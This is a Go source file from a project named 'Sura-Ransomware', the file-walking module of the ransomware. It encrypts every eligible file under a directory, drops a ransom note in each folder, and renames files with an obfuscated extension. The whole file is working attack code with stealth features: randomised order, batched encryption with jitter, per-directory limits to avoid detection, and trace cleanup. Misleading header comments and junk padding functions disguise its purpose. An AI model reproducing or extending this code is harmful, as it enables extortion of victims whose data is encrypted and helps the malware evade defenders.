// OBFUSCATED
// Windows compatibility layer
// Performance enhancement module
package filewalker

import (
	Configuration "Sura-Ransomware/configuration"
	Encryption "Sura-Ransomware/encryption"
	"Sura-Ransomware/memory"
	"encoding/base64"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

func d(s string) string {
	decoded, _ := base64.StdEncoding.DecodeString(s)
	return string(decoded)
}

func EncryptDirectory(dirPath string) {
	var wg sync.WaitGroup

	// Create in-memory ransom note handler with template processing
	ransomNote := memory.NewMemoryNote(Configuration.GetRansomNote())
	defer ransomNote.CleanupTraces()

	// Batch encryption control
	batchCount := 0
	filesInCurrentDir := 0
	batchSize := Configuration.BatchSize
	batchDelay := time.Duration(Configuration.BatchDelay) * time.Second

	// Collect all files first for randomization
	var filesToEncrypt []string

	filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
		if info.IsDir() {
			// Reset counter for new directory
			filesInCurrentDir = 0

			basePath := strings.ToLower(filepath.Base(path))
			for _, excluded := range Configuration.ExcludedDirectories {
				if strings.EqualFold(basePath, excluded) {
					return filepath.SkipDir
				}
			}

			// Drop ransom note with random delay (from memory, not disk)
			time.Sleep(time.Millisecond * time.Duration(100+len(path)%50))
			ransomNote.DropNote(filepath.Join(path, Configuration.GetObfuscatedNoteFilename()))
		}

		if !info.IsDir() {
			fileExt := filepath.Ext(path)
			for _, excluded := range Configuration.ExcludedExtensions {
				if strings.EqualFold(fileExt, excluded) {
					return nil
				}
			}

			fileName := strings.ToLower(filepath.Base(path))
			for _, excluded := range Configuration.ExcludedFiles {
				if strings.EqualFold(strings.ToLower(fileName), excluded) {
					return nil
				}
			}

			// Limit files per directory to avoid suspicious patterns
			if Configuration.MaxFilesPerDirectory > 0 {
				filesInCurrentDir++
				if filesInCurrentDir > Configuration.MaxFilesPerDirectory {
					return nil // Skip remaining files in this directory
				}
			}

			filesToEncrypt = append(filesToEncrypt, path)
		}

		return nil
	})

	// Randomize file order if configured
	if Configuration.RandomFileOrder {
		rand.Seed(time.Now().UnixNano())
		rand.Shuffle(len(filesToEncrypt), func(i, j int) {
			filesToEncrypt[i], filesToEncrypt[j] = filesToEncrypt[j], filesToEncrypt[i]
		})
	}

	// Encrypt files with stealth timing
	for _, path := range filesToEncrypt {
		// Implement batch encryption for stealth
		if Configuration.EncryptInSmallBatches {
			batchCount++
			if batchCount >= batchSize {
				// Wait between batches to avoid CPU spikes
				time.Sleep(batchDelay)
				// Add random jitter
				jitter := time.Duration(rand.Intn(3000)) * time.Millisecond
				time.Sleep(jitter)
				batchCount = 0
			}
		}

		wg.Add(1)
		go func(filePath string) {
			defer wg.Done()
			Encryption.ProcessFile(filePath)

			// Small delay before renaming to look more natural
			time.Sleep(time.Duration(50+rand.Intn(150)) * time.Millisecond)
			_ = os.Rename(filePath, filePath+Configuration.GetObfuscatedExtension())
		}(path)
	}

	wg.Wait()
}

// Obfuscation padding
func obf_41323() {
	_ = 3994
	var _ = "Gx1uffWRPKXABbw1mR4MRcjkzEOeShWbUdgjxt6gqwjeUExPLU"
}

// Obfuscation padding
func obf_25529() {
	_ = 7735
	var _ = "4iiHkWUR7Vpq2zHjCxywAl7mZaV7LmoCx2ColtJGLL5MdjqNYa"
}

// Obfuscation padding
func obf_83974() {
	_ = 8826
	var _ = "5h23GPlRaRWx446YbCElTsRlZpsyfQZ0VPO7WinNsTF1KWHqGb"
}

// Obfuscation padding
func obf_60419() {
	_ = 3830
	var _ = "pJLnUR97cay47uOdqUQlOIGjjd5QWK2qjnn5xhr1OT9nKAl999"
}

// Obfuscation padding
func obf_29989() {
	_ = 8980
	var _ = "T1EyK8Bntb5BJ7oE6S0mwkfb7cKbZ6wRdJhqpn3bJcX8U4NPVT"
}
